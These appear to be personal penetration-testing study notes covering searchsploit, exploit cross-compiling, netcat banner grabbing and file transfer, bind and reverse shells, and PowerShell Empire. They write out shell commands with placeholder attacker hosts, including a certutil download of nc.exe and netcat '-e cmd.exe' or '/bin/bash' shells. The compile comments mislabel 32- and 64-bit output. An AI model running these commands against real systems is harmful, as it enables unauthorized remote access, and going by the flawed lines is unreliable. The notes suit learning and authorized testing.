## Banner Grabbing
- Identify the services running on specific port as well as the service version
- Can be performed with:
	- #tools/multi/nmap 
	- #tools/utility/nc 

## Searchsploit
- `searchsploit <search terms>`
- Case sensitive search: `-c`
- Copy exploit to current directory
	- `searchsploit -m <id>`
- Search only in title: `-t`
- Exact search: `-e`
- Get the online link to exploit: `-w`
- `searchsploit <type> <platform> <protocol> <service>`
	- e.g. `searchsploit remote windows smb`

## Fixing Exploits
- Update any hardcoded IP addresses or paths
- Look for any other errors

## Cross-compiling Exploits
- Process of compiling code for a platform other than the one performing the complilation
- `sudo apt install mingw-x64`
- Sometimes compilation info is present in the document itself, else you need to figure it out
- `i686-w64-mingw32-gcc file.c -o exploit // 64 bit executable`
- `i686-w64-mingw32-gcc file.c -o exploit -lws2_32 // 32-bit executable`

## Shells
### #tools/utility/nc 
- Use to read/write data
- Can be used in server/client mode
- Can be used for
	- Banner grabbing
	- Port scanning
	- Transferring files
	- Bind/reverse shells
- Connect with a port
	```
	nc -nv <ip> <port>
	```
 - Add `-u` for UDP port
- Can be found on Kali at `/usr/share/windows-binaries/nc.exe`. So, you can copy it to a target machine. 
	- Start a `python -m http.server 80`
	- Run `certutil -urlcache -f http://<attacker_ip>/nc.exe`
	- Start a listener on attackers IP: `nc -nlvp <port>`
	- Connect from target to attacker: `nc -nv <attackers_ip> <port>`
- Send and receive a file
	- On the target machine:
		```
		nc -nlvp <attackers_ip> <port> > file
		```
	- On the attackers machine:
		```
		nc -nv <target_ip> <port> < file
		```

### Bind Shells
- Attacker connects directly to a listener on the target system, consequently allowing for execution of commands on the target system. (Attacker --> Target)
- Listener can be setup to execute a speciic executable linke cmd.exe or /bin/bash.
- Obtaining a bind shell with #tools/utility/nc 
	- Command on victim:
		```
		nc -nlvp <attacker> <port> -e (cmd.exe | /bin/bash)
		```
	- Command on attacker
		```
		nc -nv <target> <port>
		```

### Reverse Shell
- Type of remote shell where the target connects directly to a listener on the attackers system. (Attacker <-- Target)
- Better because outbound traffic is usually not blocked.
- If the connection is found the attackers IP would be the public IP, so can easily get caught. The attacker's machine should be directly accessible to the target
- Obtaining a reverse shell
	- Command on attacker
		```
		nc -nvlp <port>
		```
	- Command on target
		```
		nc -nv <attackers_ip> <port> -e (/bin/bash | cmd.exe)
		```

## PowerShell Empire
- Pure PowerShell exploitation/post-exploitation framework 
- **Starkiller:** GUI for PS empire